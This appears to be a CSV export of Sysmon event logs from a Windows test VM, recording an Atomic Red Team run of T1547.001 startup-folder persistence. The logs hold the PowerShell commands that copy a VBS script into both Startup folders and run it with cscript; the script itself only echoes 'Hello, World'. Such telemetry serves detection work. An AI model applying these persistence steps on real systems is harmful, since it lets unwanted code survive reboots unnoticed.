Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\cscript.exe"" ""C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs""",Microsoft Corporation,WinDev2309Eval,,,C:\Users\User\AppData\Local\Temp\,Microsoft ® Console Based Script Host,,1,9473,,5.812.10240.16384,,"MD5=E4DC5A2C67286C4D8C1BA01A8E59A321,SHA256=6D607A3F1BAA41B962D011447117215D005DA42332C19C3D0FC613BDE95E3125,IMPHASH=7DC84811DD92FBC4E2491CDB05130DC3",C:\Windows\System32\cscript.exe,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 08:46:15.096

ProcessGuid: {fda94052-35d7-658d-7402-000000000b00}

ProcessId: 6508

Image: C:\Windows\System32\cscript.exe

FileVersion: 5.812.10240.16384

Description: Microsoft ® Console Based Script Host

Product: Microsoft ® Windows Script Host

Company: Microsoft Corporation

OriginalFileName: cscript.exe

CommandLine: ""C:\Windows\system32\cscript.exe"" ""C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=E4DC5A2C67286C4D8C1BA01A8E59A321,SHA256=6D607A3F1BAA41B962D011447117215D005DA42332C19C3D0FC613BDE95E3125,IMPHASH=7DC84811DD92FBC4E2491CDB05130DC3

ParentProcessGuid: {fda94052-35d5-658d-7002-000000000b00}

ParentProcessId: 4788

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\""""
Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""
cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\""""
cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""}

ParentUser: WINDEV2309EVAL\User",Info,cscript.exe,"""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\""""
Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""
cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\""""
cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-35d5-658d-7002-000000000b00},4788,WINDEV2309EVAL\User,{fda94052-35d7-658d-7402-000000000b00},7044,6508,Microsoft ® Windows Script Host,,,,"
      ",-,2023-12-28T08:46:15.1000722Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 08:46:15.096,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T08:46:15.1000722Z""/>
      <EventRecordID>9473</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 08:46:15.096</Data>
      <Data Name=""ProcessGuid"">{fda94052-35d7-658d-7402-000000000b00}</Data>
      <Data Name=""ProcessId"">6508</Data>
      <Data Name=""Image"">C:\Windows\System32\cscript.exe</Data>
      <Data Name=""FileVersion"">5.812.10240.16384</Data>
      <Data Name=""Description"">Microsoft &#174; Console Based Script Host</Data>
      <Data Name=""Product"">Microsoft &#174; Windows Script Host</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">cscript.exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\cscript.exe"" ""C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs""</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=E4DC5A2C67286C4D8C1BA01A8E59A321,SHA256=6D607A3F1BAA41B962D011447117215D005DA42332C19C3D0FC613BDE95E3125,IMPHASH=7DC84811DD92FBC4E2491CDB05130DC3</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-35d5-658d-7002-000000000b00}</Data>
      <Data Name=""ParentProcessId"">4788</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\""""
Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""
cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\""""
cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""}</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 08:46:15.096

ProcessGuid: {fda94052-35d7-658d-7402-000000000b00}

ProcessId: 6508

Image: C:\Windows\System32\cscript.exe

FileVersion: 5.812.10240.16384

Description: Microsoft &#174; Console Based Script Host

Product: Microsoft &#174; Windows Script Host

Company: Microsoft Corporation

OriginalFileName: cscript.exe

CommandLine: ""C:\Windows\system32\cscript.exe"" ""C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=E4DC5A2C67286C4D8C1BA01A8E59A321,SHA256=6D607A3F1BAA41B962D011447117215D005DA42332C19C3D0FC613BDE95E3125,IMPHASH=7DC84811DD92FBC4E2491CDB05130DC3

ParentProcessGuid: {fda94052-35d5-658d-7002-000000000b00}

ParentProcessId: 4788

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" &amp; {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\""""
Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""
cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\""""
cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""}

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,[ZoneTransfer]  ZoneId=3  ReferrerUrl=C:\Users\User\Downloads\atomic-red-team-master.zip  ,2023-12-28 08:46:14.845,,,,15,9472,,,"MD5=6311D6C67641DC1969F318C8686C26F9,SHA256=39BF2BF8873AFF3E842F6F964A5A2E3C7BF2A42C04762229C1515DBE10D892D1,IMPHASH=00000000000000000000000000000000",,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,0x8000000000000000,Information,,,"File stream created:

RuleName: -

UtcTime: 2023-12-28 08:46:14.845

ProcessGuid: {fda94052-35d5-658d-7002-000000000b00}

ProcessId: 4788

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs:Zone.Identifier

CreationUtcTime: 2023-12-28 08:46:14.845

Hash: MD5=6311D6C67641DC1969F318C8686C26F9,SHA256=39BF2BF8873AFF3E842F6F964A5A2E3C7BF2A42C04762229C1515DBE10D892D1,IMPHASH=00000000000000000000000000000000

Contents: [ZoneTransfer]  ZoneId=3  ReferrerUrl=C:\Users\User\Downloads\atomic-red-team-master.zip  

User: WINDEV2309EVAL\User",Info,,,,,,,{fda94052-35d5-658d-7002-000000000b00},7044,4788,,,,,"
      ",-,2023-12-28T08:46:14.8521417Z,C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs:Zone.Identifier,,File stream created (rule: FileCreateStreamHash),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 08:46:14.845,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>15</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>15</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T08:46:14.8521417Z""/>
      <EventRecordID>9472</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 08:46:14.845</Data>
      <Data Name=""ProcessGuid"">{fda94052-35d5-658d-7002-000000000b00}</Data>
      <Data Name=""ProcessId"">4788</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs:Zone.Identifier</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 08:46:14.845</Data>
      <Data Name=""Hash"">MD5=6311D6C67641DC1969F318C8686C26F9,SHA256=39BF2BF8873AFF3E842F6F964A5A2E3C7BF2A42C04762229C1515DBE10D892D1,IMPHASH=00000000000000000000000000000000</Data>
      <Data Name=""Contents"">[ZoneTransfer]  ZoneId=3  ReferrerUrl=C:\Users\User\Downloads\atomic-red-team-master.zip  </Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File stream created:

RuleName: -

UtcTime: 2023-12-28 08:46:14.845

ProcessGuid: {fda94052-35d5-658d-7002-000000000b00}

ProcessId: 4788

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs:Zone.Identifier

CreationUtcTime: 2023-12-28 08:46:14.845

Hash: MD5=6311D6C67641DC1969F318C8686C26F9,SHA256=39BF2BF8873AFF3E842F6F964A5A2E3C7BF2A42C04762229C1515DBE10D892D1,IMPHASH=00000000000000000000000000000000

Contents: [ZoneTransfer]  ZoneId=3  ReferrerUrl=C:\Users\User\Downloads\atomic-red-team-master.zip  

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File stream created (rule: FileCreateStreamHash)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,2023-12-28 08:46:14.845,,,,11,9471,,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,0x8000000000000000,Information,,,"File created:

RuleName: T1023

UtcTime: 2023-12-28 08:46:14.845

ProcessGuid: {fda94052-35d5-658d-7002-000000000b00}

ProcessId: 4788

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs:Zone.Identifier

CreationUtcTime: 2023-12-28 08:46:14.845

User: WINDEV2309EVAL\User",Info,,,,,,,{fda94052-35d5-658d-7002-000000000b00},7044,4788,,,,,"
      ",T1023,2023-12-28T08:46:14.8515877Z,C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs:Zone.Identifier,,File created (rule: FileCreate),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 08:46:14.845,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T08:46:14.8515877Z""/>
      <EventRecordID>9471</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">T1023</Data>
      <Data Name=""UtcTime"">2023-12-28 08:46:14.845</Data>
      <Data Name=""ProcessGuid"">{fda94052-35d5-658d-7002-000000000b00}</Data>
      <Data Name=""ProcessId"">4788</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs:Zone.Identifier</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 08:46:14.845</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: T1023

UtcTime: 2023-12-28 08:46:14.845

ProcessGuid: {fda94052-35d5-658d-7002-000000000b00}

ProcessId: 4788

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs:Zone.Identifier

CreationUtcTime: 2023-12-28 08:46:14.845

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,"WScript.Echo(""T1547.001 Hello, World VBS!"") ",2023-12-28 08:46:14.845,,,,15,9470,,,"MD5=B6DEC52AB53E705337526758B05E4A3C,SHA256=52D464FCC5B72D50B169A45ED8FDEF22792C3FCB683F598B6E605336E53EAF78,IMPHASH=00000000000000000000000000000000",,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,0x8000000000000000,Information,,,"File stream created:

RuleName: -

UtcTime: 2023-12-28 08:46:14.845

ProcessGuid: {fda94052-35d5-658d-7002-000000000b00}

ProcessId: 4788

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs

CreationUtcTime: 2023-12-28 08:46:14.845

Hash: MD5=B6DEC52AB53E705337526758B05E4A3C,SHA256=52D464FCC5B72D50B169A45ED8FDEF22792C3FCB683F598B6E605336E53EAF78,IMPHASH=00000000000000000000000000000000

Contents: WScript.Echo(""T1547.001 Hello, World VBS!"") 

User: WINDEV2309EVAL\User",Info,,,,,,,{fda94052-35d5-658d-7002-000000000b00},7044,4788,,,,,"
      ",-,2023-12-28T08:46:14.8514699Z,C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs,,File stream created (rule: FileCreateStreamHash),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 08:46:14.845,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>15</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>15</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T08:46:14.8514699Z""/>
      <EventRecordID>9470</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 08:46:14.845</Data>
      <Data Name=""ProcessGuid"">{fda94052-35d5-658d-7002-000000000b00}</Data>
      <Data Name=""ProcessId"">4788</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 08:46:14.845</Data>
      <Data Name=""Hash"">MD5=B6DEC52AB53E705337526758B05E4A3C,SHA256=52D464FCC5B72D50B169A45ED8FDEF22792C3FCB683F598B6E605336E53EAF78,IMPHASH=00000000000000000000000000000000</Data>
      <Data Name=""Contents"">WScript.Echo(""T1547.001 Hello, World VBS!"") </Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File stream created:

RuleName: -

UtcTime: 2023-12-28 08:46:14.845

ProcessGuid: {fda94052-35d5-658d-7002-000000000b00}

ProcessId: 4788

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs

CreationUtcTime: 2023-12-28 08:46:14.845

Hash: MD5=B6DEC52AB53E705337526758B05E4A3C,SHA256=52D464FCC5B72D50B169A45ED8FDEF22792C3FCB683F598B6E605336E53EAF78,IMPHASH=00000000000000000000000000000000

Contents: WScript.Echo(""T1547.001 Hello, World VBS!"") 

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File stream created (rule: FileCreateStreamHash)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,2023-12-28 08:46:14.845,,,,11,9469,,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,0x8000000000000000,Information,,,"File created:

RuleName: T1023

UtcTime: 2023-12-28 08:46:14.845

ProcessGuid: {fda94052-35d5-658d-7002-000000000b00}

ProcessId: 4788

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs

CreationUtcTime: 2023-12-28 08:46:14.845

User: WINDEV2309EVAL\User",Info,,,,,,,{fda94052-35d5-658d-7002-000000000b00},7044,4788,,,,,"
      ",T1023,2023-12-28T08:46:14.8498021Z,C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs,,File created (rule: FileCreate),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 08:46:14.845,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T08:46:14.8498021Z""/>
      <EventRecordID>9469</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">T1023</Data>
      <Data Name=""UtcTime"">2023-12-28 08:46:14.845</Data>
      <Data Name=""ProcessGuid"">{fda94052-35d5-658d-7002-000000000b00}</Data>
      <Data Name=""ProcessId"">4788</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 08:46:14.845</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: T1023

UtcTime: 2023-12-28 08:46:14.845

ProcessGuid: {fda94052-35d5-658d-7002-000000000b00}

ProcessId: 4788

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs

CreationUtcTime: 2023-12-28 08:46:14.845

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,C:\Windows\system32\vssvc.exe,Microsoft Corporation,WinDev2309Eval,,,C:\Windows\system32\,Microsoft® Volume Shadow Copy Service,,1,9468,,10.0.22621.1 (WinBuild.160101.0800),,"MD5=E41824427731D3933591BCD216674818,SHA256=321120DE419B488B6EB0D9F32E733756FE9E97689FC0FE7FD2C9BF50AFB1BCC4,IMPHASH=BC0F5315EEA41E76B544E9F6ACFE1FEE",C:\Windows\System32\VSSVC.exe,System,0x8000000000000000,Information,{fda94052-34eb-658d-e703-000000000000},0x3e7,"Process Create:

RuleName: -

UtcTime: 2023-12-28 08:46:14.129

ProcessGuid: {fda94052-35d6-658d-7202-000000000b00}

ProcessId: 11228

Image: C:\Windows\System32\VSSVC.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Microsoft® Volume Shadow Copy Service

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: VSSVC.EXE

CommandLine: C:\Windows\system32\vssvc.exe

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\SYSTEM

LogonGuid: {fda94052-34eb-658d-e703-000000000000}

LogonId: 0x3E7

TerminalSessionId: 0

IntegrityLevel: System

Hashes: MD5=E41824427731D3933591BCD216674818,SHA256=321120DE419B488B6EB0D9F32E733756FE9E97689FC0FE7FD2C9BF50AFB1BCC4,IMPHASH=BC0F5315EEA41E76B544E9F6ACFE1FEE

ParentProcessGuid: {fda94052-34eb-658d-0b00-000000000b00}

ParentProcessId: 788

ParentImage: C:\Windows\System32\services.exe

ParentCommandLine: C:\Windows\system32\services.exe

ParentUser: NT AUTHORITY\SYSTEM",Info,VSSVC.EXE,C:\Windows\system32\services.exe,C:\Windows\System32\services.exe,{fda94052-34eb-658d-0b00-000000000b00},788,NT AUTHORITY\SYSTEM,{fda94052-35d6-658d-7202-000000000b00},7044,11228,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-28T08:46:14.1422944Z,,,Process Create (rule: ProcessCreate),0,6672,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-28 08:46:14.129,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T08:46:14.1422944Z""/>
      <EventRecordID>9468</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 08:46:14.129</Data>
      <Data Name=""ProcessGuid"">{fda94052-35d6-658d-7202-000000000b00}</Data>
      <Data Name=""ProcessId"">11228</Data>
      <Data Name=""Image"">C:\Windows\System32\VSSVC.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Microsoft&#174; Volume Shadow Copy Service</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">VSSVC.EXE</Data>
      <Data Name=""CommandLine"">C:\Windows\system32\vssvc.exe</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
      <Data Name=""LogonGuid"">{fda94052-34eb-658d-e703-000000000000}</Data>
      <Data Name=""LogonId"">0x3e7</Data>
      <Data Name=""TerminalSessionId"">0</Data>
      <Data Name=""IntegrityLevel"">System</Data>
      <Data Name=""Hashes"">MD5=E41824427731D3933591BCD216674818,SHA256=321120DE419B488B6EB0D9F32E733756FE9E97689FC0FE7FD2C9BF50AFB1BCC4,IMPHASH=BC0F5315EEA41E76B544E9F6ACFE1FEE</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-34eb-658d-0b00-000000000b00}</Data>
      <Data Name=""ParentProcessId"">788</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\services.exe</Data>
      <Data Name=""ParentCommandLine"">C:\Windows\system32\services.exe</Data>
      <Data Name=""ParentUser"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 08:46:14.129

ProcessGuid: {fda94052-35d6-658d-7202-000000000b00}

ProcessId: 11228

Image: C:\Windows\System32\VSSVC.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Microsoft&#174; Volume Shadow Copy Service

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: VSSVC.EXE

CommandLine: C:\Windows\system32\vssvc.exe

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\SYSTEM

LogonGuid: {fda94052-34eb-658d-e703-000000000000}

LogonId: 0x3E7

TerminalSessionId: 0

IntegrityLevel: System

Hashes: MD5=E41824427731D3933591BCD216674818,SHA256=321120DE419B488B6EB0D9F32E733756FE9E97689FC0FE7FD2C9BF50AFB1BCC4,IMPHASH=BC0F5315EEA41E76B544E9F6ACFE1FEE

ParentProcessGuid: {fda94052-34eb-658d-0b00-000000000b00}

ParentProcessId: 788

ParentImage: C:\Windows\System32\services.exe

ParentCommandLine: C:\Windows\system32\services.exe

ParentUser: NT AUTHORITY\SYSTEM</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,2023-12-28 08:46:13.656,,,,11,9467,,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-28 08:46:13.656

ProcessGuid: {fda94052-35d5-658d-7002-000000000b00}

ProcessId: 4788

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_o1d0t0zc.r0x.ps1

CreationUtcTime: 2023-12-28 08:46:13.656

User: WINDEV2309EVAL\User",Info,,,,,,,{fda94052-35d5-658d-7002-000000000b00},7044,4788,,,,,"
